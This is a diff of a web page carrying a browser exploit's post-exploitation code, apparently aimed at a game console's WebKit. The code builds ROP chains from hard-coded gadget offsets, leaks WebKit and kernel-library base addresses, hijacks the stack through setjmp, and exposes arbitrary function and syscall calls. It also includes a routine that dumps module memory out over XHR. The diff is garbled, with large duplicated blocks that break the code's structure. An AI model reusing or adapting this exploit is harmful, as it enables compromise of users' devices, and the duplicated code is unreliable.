@@ -39,7 +39,6 @@
                      this.fcall = function (rip, rdi, rsi, rdx, r10, r8, r9)
                      0x000000000011add7 : mov qword ptr [rdi], rax ; ret
                      */
-
                 window.gadgets = {
                     "pop rsi": 0xa459e,
                     "pop rdi": 0x10f1c1,
@@ -63,7 +62,9 @@
                 window.postexploit = function(p)
                 {
                     document.getElementById("clck").style.display = 'none';
-
+                window.postexploit = function(p)
+                {
+                    document.getElementById("clck").style.display = 'none';
                     var hexdump = function(address, size) {
                         var ret = "\nHex Dump of 0x" + address + ": \n";
                         var addr_copy = address.add32(0);
@@ -73,12 +74,21 @@
                             ret += "<a href='javascript:window.printdump(" + rd.low.toString() + ", " + rd.hi.toString() + ")'>0x" + rd.toString(16) + "</a>\n";
                         }
 
+
                         return ret;
                     };
 
                     var print = function(string) {
                         document.getElementById("console").innerHTML += string + "\n";
                     }
+                        
+                        return ret;
+                    };
+                    
+                    var print = function(string) {
+                        document.getElementById("console").innerHTML += string + "\n";
+                    }
+                    
 
                     var xhr_sync_log = function(str) {
                         var req = new XMLHttpRequest();
@@ -88,17 +98,27 @@
                         } catch(e){}
                     }
 
+
                     window.printdump = function(a,b) {
                         print(hexdump(new int64(a,b), 96));
                     }
 
                     print(" === exploit succeeded === ");
 
+
+                    
+                    window.printdump = function(a,b) {
+                        print(hexdump(new int64(a,b), 96));
+                    }
+                    
+                    print(" === exploit succeeded === ");
+                    
                     p.leakfcn = function(smashfcn) {
                         var smashobj = p.leakval(smashfcn);
                         var smashbase = p.read8(smashobj.add32(0x18));
                         return smashbase.add32(0x20);
                     }
+
 
                     var fcnptr = p.read8(p.leakfcn(parseFloat));
 
@@ -108,11 +128,23 @@
                     webKitBase.low &= ~0xFFF;
                     webKitBase.sub32inplace(0x55000);
 
+
+                    
+                    var fcnptr = p.read8(p.leakfcn(parseFloat));
+                    
+                    print("leaked parseFloat at 0x" + fcnptr);
+                    
+                    var webKitBase = fcnptr.add32(0); // copy
+                    webKitBase.low &= ~0xFFF;
+                    webKitBase.sub32inplace(0x55000);
+                    
+
                     if (p.read4(webKitBase.add32(window.gadgets["jop1"])) != 0x187f8b48)
                     {
                         print("exploit successful but gadgets are incompatible with this version");
                         return;
                     }
+
 
                     var libSceKernel = p.read8(webKitBase.add32(window.gadgets["got_entry_stack_chk_fail"]));
                     libSceKernel.low &= ~0xFFF;
@@ -123,6 +155,19 @@
 
                     // 48 8B 7F 18 48 8B 07 48  8B 40 30 FF E0
 
+
+
+                    
+                    var libSceKernel = p.read8(webKitBase.add32(window.gadgets["got_entry_stack_chk_fail"]));
+                    libSceKernel.low &= ~0xFFF;
+                    libSceKernel.sub32inplace(0xd000);
+                    
+                    print("webKit base at 0x" + webKitBase);
+                    print("libSceKernel base at 0x" + libSceKernel);
+                    
+                    // 48 8B 7F 18 48 8B 07 48  8B 40 30 FF E0
+                    
+                    
 
                     var findModuleBaseXHR = function(addr)
                     {
@@ -135,11 +180,13 @@
                         }
                     }
 
+                    
                     var dumpModuleXHR = function(moduleBase) {
                         var chunk = new ArrayBuffer(0x200);
                         var chunk32 = new Uint32Array(chunk);
                         var chunk8 = new Uint8Array(chunk);
 
+                      
                         function bufferToBase64(buf) {
                             var binstr = Array.prototype.map.call(buf, function (ch) {
                                                                   return String.fromCharCode(ch);
@@ -147,6 +194,7 @@
                                                                   return btoa(binstr);
                         }
 
+                      
                         var moduleBase_ = moduleBase.add32(0); // copy
                         while (1) {
                             var sendmsg = "";
@@ -157,6 +205,8 @@
                                 moduleBase_.add32inplace(4);
                             }
 
+                          
+
                             xhr_sync_log(bufferToBase64(chunk8));
                         }
                     }
@@ -166,12 +216,27 @@
 
                     for (var i = 0; i < 0x7fff; i++) argz[i] = 0x41410000|i;
 
+
+                  
+                            
+                            xhr_sync_log(bufferToBase64(chunk8));
+                        }
+                    }
+                    
+                    var fptr_store = p.leakfcn(parseFloat);
+                    var argz = [];
+                    
+                    for (var i = 0; i < 0x7fff; i++) argz[i] = 0x41410000|i;
+                    
+
+          
                     var argbuf = new Uint32Array(0x1000);
                     var argptr = p.read8(p.leakval(argbuf).add32(0x28));
                     argbuf[0] = 0x13371337;
                     if (p.read4(argptr) != 0x13371337) throw new Error("Uint32Array struct layout not recognized :(");
                     window.dont_tread_on_me = [argbuf];
 
+          
                     p.loadchain = function(chain)
                     {
                         var stackPointer = 0;
@@ -180,6 +245,8 @@
                         var reenter_help = {length: {valueOf: function(){
                             orig_reenter_rip = p.read8(stackPointer);
                             var returnToFrame = stackPointer;
+
+                         
 
                             var ocnt = chain.count;
                             chain.push_write8(stackPointer, orig_reenter_rip);
@@ -193,6 +260,22 @@
 
                             p.write8(stackPointer, webKitBase.add32(window.gadgets["pop rsp"])); // pop rsp
                             p.write8(stackPointer.add32(8), chain.ropframeptr); // -> rop frame
+
+
+                            
+                            var ocnt = chain.count;
+                            chain.push_write8(stackPointer, orig_reenter_rip);
+                            chain.push_write8(stackPointer.add32(8), stackCookie);
+                            
+                            if (chain.runtime) returnToFrame=chain.runtime(stackPointer);
+                            
+                            chain.push(webKitBase.add32(window.gadgets["pop rsp"])); // pop rsp
+                            chain.push(returnToFrame); // -> back to the trap life
+                            chain.count = ocnt;
+                            
+                            p.write8(stackPointer, webKitBase.add32(window.gadgets["pop rsp"])); // pop rsp
+                            p.write8(stackPointer.add32(8), chain.ropframeptr); // -> rop frame
+                            
 
                             return 0;
                         }}};
@@ -214,9 +297,17 @@
                                 p.write8(argptr.add32(0x130), webKitBase.add32(window.gadgets["setjmp"])); // setjmp
                                 p.write8(fptr_store, webKitBase.add32(window.gadgets["jop1"])); // gadget 1
 
+
                                 (function(){}).apply(null, argz); // clear frame
                                 p.write8(trap.add32(0x18), argptr); // write to frame
                                 p.leakval(parseFloat()); // call setjmp
+
+
+                                
+                                (function(){}).apply(null, argz); // clear frame
+                                p.write8(trap.add32(0x18), argptr); // write to frame
+                                p.leakval(parseFloat()); // call setjmp
+                                
 
                                 stackPointer = p.read8(argptr.add32(0x10));
                                 stackCookie = p.read8(stackPointer.add32(8));
@@ -227,6 +318,12 @@
                                 return p.leakval(rtv);
                                 }).apply(null, argz);
                     }
+
+                                
+                                return p.leakval(rtv);
+                                }).apply(null, argz);
+                    }
+                    
 
                     var RopChain = function () {
                         this.ropframe = new Uint32Array(0x1000);
@@ -276,12 +373,14 @@
                             return this;
                         }
 
+                        
                         this.run = function() {
                             var retv = p.loadchain(this);
                             this.clear();
                             return retv;
                         }
 
+                        
                         return this;
                     };
                     window.nogc = [];
@@ -301,11 +400,19 @@
                         var chain = new RopChain();
                         chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
 
+
+                    
+                    p.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
+                        var chain = new RopChain();
+                        chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
+                        
+
                         chain.push(webKitBase.add32(window.gadgets["pop rdi"])); // pop rdi
                         chain.push(chain.ropframeptr.add32(0x3ff8)); // where
                         chain.push(webKitBase.add32(window.gadgets["mov [rdi], rax"])); // rdi = rax
                         chain.push(webKitBase.add32(window.gadgets["pop rax"])); // pop rax
                         chain.push(p.leakval(0x41414242)); // where
+
 
                         if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
 
@@ -314,6 +421,17 @@
 
                     window.syscalls = {1: 0x26D0, 2: 0x2830, 3: 0x25F0, 4: 0x2730, 5: 0x2570, 6: 0x24D0, 7: 0x2710, 10: 0x0690, 12: 0x06B0, 15: 0x06D0, 20: 0x06F0, 23: 0x0710, 24: 0x0730, 25: 0x0750, 27: 0x2650, 28: 0x2690, 29: 0x2630, 30: 0x2490, 31: 0x0770, 32: 0x0790, 33: 0x07B0, 34: 0x07D0, 35: 0x07F0, 36: 0x0810, 37: 0x0830, 39: 0x0870, 41: 0x08B0, 42: 0x05F0, 43: 0x08D0, 44: 0x08F0, 47: 0x0910, 49: 0x26F0, 50: 0x0640, 53: 0x0950, 54: 0x0970, 55: 0x0620, 56: 0x0990, 59: 0x059D, 59: 0x09B0, 65: 0x2530, 73: 0x09F0, 74: 0x0A10, 75: 0x0A30, 78: 0x0A50, 79: 0x0A70, 80: 0x0A90, 83: 0x0AB0, 86: 0x0AD0, 89: 0x0AF0, 90: 0x0B10, 92: 0x0B30, 93: 0x2670, 95: 0x2510, 96: 0x0B50, 97: 0x0B70, 98: 0x24F0, 99: 0x0B90, 100: 0x0BB0, 101: 0x0BD0, 102: 0x0BF0, 104: 0x0C10, 105: 0x0C30, 106: 0x0C50, 113: 0x0C70, 114: 0x0C90, 116: 0x0CB0, 117: 0x0CD0, 118: 0x0CF0, 120: 0x2610, 121: 0x2750, 122: 0x0D10, 124: 0x0D30, 125: 0x0D50, 126: 0x0D70, 127: 0x0D90, 128: 0x0DB0, 131: 0x0DD0, 133: 0x26B0, 134: 0x0DF0, 135: 0x0E10, 136: 0x0E30, 137: 0x0E50, 138: 0x0E70, 140: 0x0E90, 141: 0x0EB0, 147: 0x0F10, 165: 0x0F70, 182: 0x0F90, 183: 0x0FB0, 188: 0x0850, 189: 0x09D0, 190: 0x0890, 191: 0x0FD0, 192: 0x0FF0, 194: 0x0ED0, 195: 0x0EF0, 196: 0x0F30, 202: 0x1010, 203: 0x1030, 204: 0x1050, 206: 0x1070, 209: 0x25B0, 232: 0x1090, 233: 0x10B0, 234: 0x10D0, 235: 0x10F0, 236: 0x1110, 237: 0x1130, 238: 0x1150, 239: 0x1170, 240: 0x2550, 251: 0x0470, 253: 0x1190, 272: 0x11B0, 289: 0x11D0, 290: 0x11F0, 310: 0x1210, 315: 0x24B0, 324: 0x1230, 325: 0x1250, 327: 0x1270, 328: 0x1290, 329: 0x12B0, 330: 0x12D0, 331: 0x12F0, 332: 0x1310, 333: 0x1330, 334: 0x1350, 340: 0x2890, 340: 0x2933, 341: 0x28B0, 343: 0x0930, 345: 0x28D0, 346: 0x28F0, 362: 0x1390, 363: 0x13B0, 379: 0x13D0, 392: 0x13F0, 393: 0x1370, 397: 0x0F50, 400: 0x1410, 401: 0x1430, 402: 0x1450, 403: 0x1470, 404: 0x1490, 405: 0x14B0, 406: 0x14D0, 407: 0x14F0, 408: 0x1510, 416: 0x2870, 417: 0x0670, 421: 0x05C4, 422: 0x2850, 423: 0x2910, 429: 0x1530, 430: 0x1550, 431: 0x1570, 432: 0x1590, 433: 0x15B0, 434: 0x15D0, 435: 0x15F0, 441: 0x1610, 442: 0x1630, 443: 0x1650, 444: 0x1670, 454: 0x1690, 454: 0x29C0, 455: 0x16B0, 456: 0x16D0, 464: 0x16F0, 466: 0x1710, 475: 0x27D0, 476: 0x27F0, 477: 0x27B0, 478: 0x2790, 479: 0x2810, 480: 0x2770, 481: 0x1730, 482: 0x1750, 483: 0x1770, 486: 0x1790, 487: 0x17B0, 488: 0x17D0, 499: 0x2590, 522: 0x25D0, 532: 0x17F0, 533: 0x1810, 534: 0x1830, 535: 0x1850, 536: 0x1870, 538: 0x1890, 539: 0x18B0, 540: 0x18D0, 541: 0x18F0, 542: 0x1910, 543: 0x1930, 544: 0x1950, 545: 0x1970, 546: 0x1990, 547: 0x19B0, 548: 0x19D0, 549: 0x19F0, 550: 0x1A10, 551: 0x1A30, 552: 0x1A50, 553: 0x1A70, 554: 0x1A90, 555: 0x1AB0, 556: 0x1AD0, 557: 0x1AF0, 558: 0x1B10, 559: 0x1B30, 560: 0x1B50, 563: 0x1B70, 564: 0x1B90, 565: 0x1BB0, 566: 0x1BD0, 567: 0x1BF0, 572: 0x1C10, 580: 0x1C30, 581: 0x1C50, 582: 0x1C70, 583: 0x1C90, 584: 0x1CB0, 585: 0x1CD0, 586: 0x1CF0, 587: 0x1D10, 588: 0x1D30, 591: 0x1D50, 592: 0x1D70, 593: 0x1D90, 594: 0x1DB0, 595: 0x1DD0, 596: 0x1DF0, 598: 0x1E10, 599: 0x1E30, 600: 0x1E50, 601: 0x1E70, 602: 0x1E90, 603: 0x1EB0, 604: 0x1ED0, 605: 0x1EF0, 606: 0x1F10, 607: 0x1F30, 608: 0x1F50, 610: 0x1F70, 611: 0x1F90, 612: 0x1FB0, 613: 0x1FD0, 615: 0x1FF0, 616: 0x2010, 617: 0x2030, 618: 0x2050, 619: 0x2070, 620: 0x2090, 622: 0x20B0, 623: 0x20D0, 624: 0x20F0, 625: 0x2110, 626: 0x2130, 627: 0x2150, 628: 0x2170, 629: 0x2190, 630: 0x21B0, 632: 0x21D0, 633: 0x21F0, 634: 0x2210, 635: 0x2230, 636: 0x2250, 637: 0x2270, 638: 0x2290, 639: 0x22B0, 640: 0x22D0, 641: 0x22F0, 642: 0x2310, 643: 0x2330, 644: 0x2350, 646: 0x2370, 647: 0x2390, 648: 0x23B0, 649: 0x23D0, 652: 0x23F0, 653: 0x2410, 654: 0x2430, 655: 0x2450, 656: 0x2470}; // not 100% correct but heh
                     window.syscallnames = {"sys_exit": 1,"fork": 2,"read": 3,"write": 4,"open": 5,"close": 6,"wait4": 7,"unlink": 10,"chdir": 12,"chmod": 15,"getpid": 20,"setuid": 23,"getuid": 24,"geteuid": 25,"recvmsg": 27,"sendmsg": 28,"recvfrom": 29,"accept": 30,"getpeername": 31,"getsockname": 32,"access": 33,"chflags": 34,"fchflags": 35,"sync": 36,"kill": 37,"getppid": 39,"dup": 41,"pipe": 42,"getegid": 43,"profil": 44,"getgid": 47,"getlogin": 49,"setlogin": 50,"sigaltstack": 53,"ioctl": 54,"reboot": 55,"revoke": 56,"execve": 59,"execve": 59,"msync": 65,"munmap": 73,"mprotect": 74,"madvise": 75,"mincore": 78,"getgroups": 79,"setgroups": 80,"setitimer": 83,"getitimer": 86,"getdtablesize": 89,"dup2": 90,"fcntl": 92,"select": 93,"fsync": 95,"setpriority": 96,"socket": 97,"connect": 98,"accept": 99,"getpriority": 100,"send": 101,"recv": 102,"bind": 104,"setsockopt": 105,"listen": 106,"recvmsg": 113,"sendmsg": 114,"gettimeofday": 116,"getrusage": 117,"getsockopt": 118,"readv": 120,"writev": 121,"settimeofday": 122,"fchmod": 124,"recvfrom": 125,"setreuid": 126,"setregid": 127,"rename": 128,"flock": 131,"sendto": 133,"shutdown": 134,"socketpair": 135,"mkdir": 136,"rmdir": 137,"utimes": 138,"adjtime": 140,"getpeername": 141,"setsid": 147,"sysarch": 165,"setegid": 182,"seteuid": 183,"stat": 188,"fstat": 189,"lstat": 190,"pathconf": 191,"fpathconf": 192,"getrlimit": 194,"setrlimit": 195,"getdirentries": 196,"__sysctl": 202,"mlock": 203,"munlock": 204,"futimes": 206,"poll": 209,"clock_gettime": 232,"clock_settime": 233,"clock_getres": 234,"ktimer_create": 235,"ktimer_delete": 236,"ktimer_settime": 237,"ktimer_gettime": 238,"ktimer_getoverrun": 239,"nanosleep": 240,"rfork": 251,"issetugid": 253,"getdents": 272,"preadv": 289,"pwritev": 290,"getsid": 310,"aio_suspend": 315,"mlockall": 324,"munlockall": 325,"sched_setparam": 327,"sched_getparam": 328,"sched_setscheduler": 329,"sched_getscheduler": 330,"sched_yield": 331,"sched_get_priority_max": 332,"sched_get_priority_min": 333,"sched_rr_get_interval": 334,"sigprocmask": 340,"sigprocmask": 340,"sigsuspend": 341,"sigpending": 343,"sigtimedwait": 345,"sigwaitinfo": 346,"kqueue": 362,"kevent": 363,"uuidgen": 392,"sendfile": 393,"fstatfs": 397,"ksem_close": 400,"ksem_post": 401,"ksem_wait": 402,"ksem_trywait": 403,"ksem_init": 404,"ksem_open": 405,"ksem_unlink": 406,"ksem_getvalue": 407,"ksem_destroy": 408,"sigaction": 416,"sigreturn": 417,"getcontext": 421,"setcontext": 422,"swapcontext": 423,"sigwait": 429,"thr_create": 430,"thr_exit": 431,"thr_self": 432,"thr_kill": 433,"ksem_timedwait": 441,"thr_suspend": 442,"thr_wake": 443,"kldunloadf": 444,"_umtx_op": 454,"_umtx_op": 454,"thr_new": 455,"sigqueue": 456,"thr_set_name": 464,"rtprio_thread": 466,"pread": 475,"pwrite": 476,"mmap": 477,"lseek": 478,"truncate": 479,"ftruncate": 480,"thr_kill2": 481,"shm_open": 482,"shm_unlink": 483,"cpuset_getid": 486,"cpuset_getaffinity": 487,"cpuset_setaffinity": 488,"openat": 499,"pselect": 522,"wait6": 532,"cap_rights_limit": 533,"cap_ioctls_limit": 534,"cap_ioctls_get": 535,"cap_fcntls_limit": 536,"bindat": 538,"connectat": 539,"chflagsat": 540,"accept4": 541,"pipe2": 542,"aio_mlock": 543,"procctl": 544,"ppoll": 545,"futimens": 546,"utimensat": 547,"numa_getaffinity": 548,"numa_setaffinity": 549}
+
+
+                        
+                        if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
+                        
+                        return p.read8(chain.ropframeptr.add32(0x3ff8));
+                    }
+                    
+                    window.syscalls = {1: 0x26D0, 2: 0x2830, 3: 0x25F0, 4: 0x2730, 5: 0x2570, 6: 0x24D0, 7: 0x2710, 10: 0x0690, 12: 0x06B0, 15: 0x06D0, 20: 0x06F0, 23: 0x0710, 24: 0x0730, 25: 0x0750, 27: 0x2650, 28: 0x2690, 29: 0x2630, 30: 0x2490, 31: 0x0770, 32: 0x0790, 33: 0x07B0, 34: 0x07D0, 35: 0x07F0, 36: 0x0810, 37: 0x0830, 39: 0x0870, 41: 0x08B0, 42: 0x05F0, 43: 0x08D0, 44: 0x08F0, 47: 0x0910, 49: 0x26F0, 50: 0x0640, 53: 0x0950, 54: 0x0970, 55: 0x0620, 56: 0x0990, 59: 0x059D, 59: 0x09B0, 65: 0x2530, 73: 0x09F0, 74: 0x0A10, 75: 0x0A30, 78: 0x0A50, 79: 0x0A70, 80: 0x0A90, 83: 0x0AB0, 86: 0x0AD0, 89: 0x0AF0, 90: 0x0B10, 92: 0x0B30, 93: 0x2670, 95: 0x2510, 96: 0x0B50, 97: 0x0B70, 98: 0x24F0, 99: 0x0B90, 100: 0x0BB0, 101: 0x0BD0, 102: 0x0BF0, 104: 0x0C10, 105: 0x0C30, 106: 0x0C50, 113: 0x0C70, 114: 0x0C90, 116: 0x0CB0, 117: 0x0CD0, 118: 0x0CF0, 120: 0x2610, 121: 0x2750, 122: 0x0D10, 124: 0x0D30, 125: 0x0D50, 126: 0x0D70, 127: 0x0D90, 128: 0x0DB0, 131: 0x0DD0, 133: 0x26B0, 134: 0x0DF0, 135: 0x0E10, 136: 0x0E30, 137: 0x0E50, 138: 0x0E70, 140: 0x0E90, 141: 0x0EB0, 147: 0x0F10, 165: 0x0F70, 182: 0x0F90, 183: 0x0FB0, 188: 0x0850, 189: 0x09D0, 190: 0x0890, 191: 0x0FD0, 192: 0x0FF0, 194: 0x0ED0, 195: 0x0EF0, 196: 0x0F30, 202: 0x1010, 203: 0x1030, 204: 0x1050, 206: 0x1070, 209: 0x25B0, 232: 0x1090, 233: 0x10B0, 234: 0x10D0, 235: 0x10F0, 236: 0x1110, 237: 0x1130, 238: 0x1150, 239: 0x1170, 240: 0x2550, 251: 0x0470, 253: 0x1190, 272: 0x11B0, 289: 0x11D0, 290: 0x11F0, 310: 0x1210, 315: 0x24B0, 324: 0x1230, 325: 0x1250, 327: 0x1270, 328: 0x1290, 329: 0x12B0, 330: 0x12D0, 331: 0x12F0, 332: 0x1310, 333: 0x1330, 334: 0x1350, 340: 0x2890, 340: 0x2933, 341: 0x28B0, 343: 0x0930, 345: 0x28D0, 346: 0x28F0, 362: 0x1390, 363: 0x13B0, 379: 0x13D0, 392: 0x13F0, 393: 0x1370, 397: 0x0F50, 400: 0x1410, 401: 0x1430, 402: 0x1450, 403: 0x1470, 404: 0x1490, 405: 0x14B0, 406: 0x14D0, 407: 0x14F0, 408: 0x1510, 416: 0x2870, 417: 0x0670, 421: 0x05C4, 422: 0x2850, 423: 0x2910, 429: 0x1530, 430: 0x1550, 431: 0x1570, 432: 0x1590, 433: 0x15B0, 434: 0x15D0, 435: 0x15F0, 441: 0x1610, 442: 0x1630, 443: 0x1650, 444: 0x1670, 454: 0x1690, 454: 0x29C0, 455: 0x16B0, 456: 0x16D0, 464: 0x16F0, 466: 0x1710, 475: 0x27D0, 476: 0x27F0, 477: 0x27B0, 478: 0x2790, 479: 0x2810, 480: 0x2770, 481: 0x1730, 482: 0x1750, 483: 0x1770, 486: 0x1790, 487: 0x17B0, 488: 0x17D0, 499: 0x2590, 522: 0x25D0, 532: 0x17F0, 533: 0x1810, 534: 0x1830, 535: 0x1850, 536: 0x1870, 538: 0x1890, 539: 0x18B0, 540: 0x18D0, 541: 0x18F0, 542: 0x1910, 543: 0x1930, 544: 0x1950, 545: 0x1970, 546: 0x1990, 547: 0x19B0, 548: 0x19D0, 549: 0x19F0, 550: 0x1A10, 551: 0x1A30, 552: 0x1A50, 553: 0x1A70, 554: 0x1A90, 555: 0x1AB0, 556: 0x1AD0, 557: 0x1AF0, 558: 0x1B10, 559: 0x1B30, 560: 0x1B50, 563: 0x1B70, 564: 0x1B90, 565: 0x1BB0, 566: 0x1BD0, 567: 0x1BF0, 572: 0x1C10, 580: 0x1C30, 581: 0x1C50, 582: 0x1C70, 583: 0x1C90, 584: 0x1CB0, 585: 0x1CD0, 586: 0x1CF0, 587: 0x1D10, 588: 0x1D30, 591: 0x1D50, 592: 0x1D70, 593: 0x1D90, 594: 0x1DB0, 595: 0x1DD0, 596: 0x1DF0, 598: 0x1E10, 599: 0x1E30, 600: 0x1E50, 601: 0x1E70, 602: 0x1E90, 603: 0x1EB0, 604: 0x1ED0, 605: 0x1EF0, 606: 0x1F10, 607: 0x1F30, 608: 0x1F50, 610: 0x1F70, 611: 0x1F90, 612: 0x1FB0, 613: 0x1FD0, 615: 0x1FF0, 616: 0x2010, 617: 0x2030, 618: 0x2050, 619: 0x2070, 620: 0x2090, 622: 0x20B0, 623: 0x20D0, 624: 0x20F0, 625: 0x2110, 626: 0x2130, 627: 0x2150, 628: 0x2170, 629: 0x2190, 630: 0x21B0, 632: 0x21D0, 633: 0x21F0, 634: 0x2210, 635: 0x2230, 636: 0x2250, 637: 0x2270, 638: 0x2290, 639: 0x22B0, 640: 0x22D0, 641: 0x22F0, 642: 0x2310, 643: 0x2330, 644: 0x2350, 646: 0x2370, 647: 0x2390, 648: 0x23B0, 649: 0x23D0, 652: 0x23F0, 653: 0x2410, 654: 0x2430, 655: 0x2450, 656: 0x2470}; // not 100% correct but heh
+                    window.syscallnames = {"sys_exit": 1,"fork": 2,"read": 3,"write": 4,"open": 5,"close": 6,"wait4": 7,"unlink": 10,"chdir": 12,"chmod": 15,"getpid": 20,"setuid": 23,"getuid": 24,"geteuid": 25,"recvmsg": 27,"sendmsg": 28,"recvfrom": 29,"accept": 30,"getpeername": 31,"getsockname": 32,"access": 33,"chflags": 34,"fchflags": 35,"sync": 36,"kill": 37,"getppid": 39,"dup": 41,"pipe": 42,"getegid": 43,"profil": 44,"getgid": 47,"getlogin": 49,"setlogin": 50,"sigaltstack": 53,"ioctl": 54,"reboot": 55,"revoke": 56,"execve": 59,"execve": 59,"msync": 65,"munmap": 73,"mprotect": 74,"madvise": 75,"mincore": 78,"getgroups": 79,"setgroups": 80,"setitimer": 83,"getitimer": 86,"getdtablesize": 89,"dup2": 90,"fcntl": 92,"select": 93,"fsync": 95,"setpriority": 96,"socket": 97,"connect": 98,"accept": 99,"getpriority": 100,"send": 101,"recv": 102,"bind": 104,"setsockopt": 105,"listen": 106,"recvmsg": 113,"sendmsg": 114,"gettimeofday": 116,"getrusage": 117,"getsockopt": 118,"readv": 120,"writev": 121,"settimeofday": 122,"fchmod": 124,"recvfrom": 125,"setreuid": 126,"setregid": 127,"rename": 128,"flock": 131,"sendto": 133,"shutdown": 134,"socketpair": 135,"mkdir": 136,"rmdir": 137,"utimes": 138,"adjtime": 140,"getpeername": 141,"setsid": 147,"sysarch": 165,"setegid": 182,"seteuid": 183,"stat": 188,"fstat": 189,"lstat": 190,"pathconf": 191,"fpathconf": 192,"getrlimit": 194,"setrlimit": 195,"getdirentries": 196,"__sysctl": 202,"mlock": 203,"munlock": 204,"futimes": 206,"poll": 209,"clock_gettime": 232,"clock_settime": 233,"clock_getres": 234,"ktimer_create": 235,"ktimer_delete": 236,"ktimer_settime": 237,"ktimer_gettime": 238,"ktimer_getoverrun": 239,"nanosleep": 240,"rfork": 251,"issetugid": 253,"getdents": 272,"preadv": 289,"pwritev": 290,"getsid": 310,"aio_suspend": 315,"mlockall": 324,"munlockall": 325,"sched_setparam": 327,"sched_getparam": 328,"sched_setscheduler": 329,"sched_getscheduler": 330,"sched_yield": 331,"sched_get_priority_max": 332,"sched_get_priority_min": 333,"sched_rr_get_interval": 334,"sigprocmask": 340,"sigprocmask": 340,"sigsuspend": 341,"sigpending": 343,"sigtimedwait": 345,"sigwaitinfo": 346,"kqueue": 362,"kevent": 363,"uuidgen": 392,"sendfile": 393,"fstatfs": 397,"ksem_close": 400,"ksem_post": 401,"ksem_wait": 402,"ksem_trywait": 403,"ksem_init": 404,"ksem_open": 405,"ksem_unlink": 406,"ksem_getvalue": 407,"ksem_destroy": 408,"sigaction": 416,"sigreturn": 417,"getcontext": 421,"setcontext": 422,"swapcontext": 423,"sigwait": 429,"thr_create": 430,"thr_exit": 431,"thr_self": 432,"thr_kill": 433,"ksem_timedwait": 441,"thr_suspend": 442,"thr_wake": 443,"kldunloadf": 444,"_umtx_op": 454,"_umtx_op": 454,"thr_new": 455,"sigqueue": 456,"thr_set_name": 464,"rtprio_thread": 466,"pread": 475,"pwrite": 476,"mmap": 477,"lseek": 478,"truncate": 479,"ftruncate": 480,"thr_kill2": 481,"shm_open": 482,"shm_unlink": 483,"cpuset_getid": 486,"cpuset_getaffinity": 487,"cpuset_setaffinity": 488,"openat": 499,"pselect": 522,"wait6": 532,"cap_rights_limit": 533,"cap_ioctls_limit": 534,"cap_ioctls_get": 535,"cap_fcntls_limit": 536,"bindat": 538,"connectat": 539,"chflagsat": 540,"accept4": 541,"pipe2": 542,"aio_mlock": 543,"procctl": 544,"ppoll": 545,"futimens": 546,"utimensat": 547,"numa_getaffinity": 548,"numa_setaffinity": 549}
+                    
 
                     p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9)
                     {
@@ -324,12 +442,14 @@
                             throw new Error("invalid syscall");
                         }
 
+                      
                         var off = window.syscalls[sysc];
                         if (off == undefined)
                         {
                             throw new Error("invalid syscall");
                         }
 
+                      
                         return p.fcall(libSceKernel.add32(off), rdi, rsi, rdx, rcx, r8, r9);
                     }
                     p.readstr = function(addr){
@@ -355,7 +475,6 @@
                         print("pipe(): " + p.syscall("pipe", scratch) + "\n\tfd[0]: " + p.read4(scratch) + "\n\tfd[1]: " + p.read4(scratch.add32(4)));
                     }
 
-
                     print("<a href=javascript:window.trycall();>try call</a>");
                     print("<a href=javascript:window.trysyscall();>try syscall</a>");
                 }
@@ -372,7 +491,11 @@
                             <a href="twitter.com/qwertyoruiopz">@qwertyoruiopz</a>
                         </p>
                         <p class="lead">
+
                             <a id="click" href="javascript:go()" class="btn btn-lg btn-secondary">Launch</a>
+
+                            <a id="clck" href="javascript:go()" class="btn btn-lg btn-secondary">Launch</a>
+
                         </p>
                     </div>
                     <div class="mastfoot">
@@ -389,9 +512,14 @@
     <!-- Placed at the end of the document so the pages load faster -->
         <script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" crossorigin="anonymous"></script>
         <script>
+
             window.jQuery || document.write('<script src="../../assets/js/vendor/jquery.min.js"></script>')
+
+            window.jQuery || document.write('<script src="../../assets/js/vendor/jquery.min.js"><\/script>')
+
         </script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
         <script src="/js/bootstrap.min.js"></script>
     </body>
+
 </html>
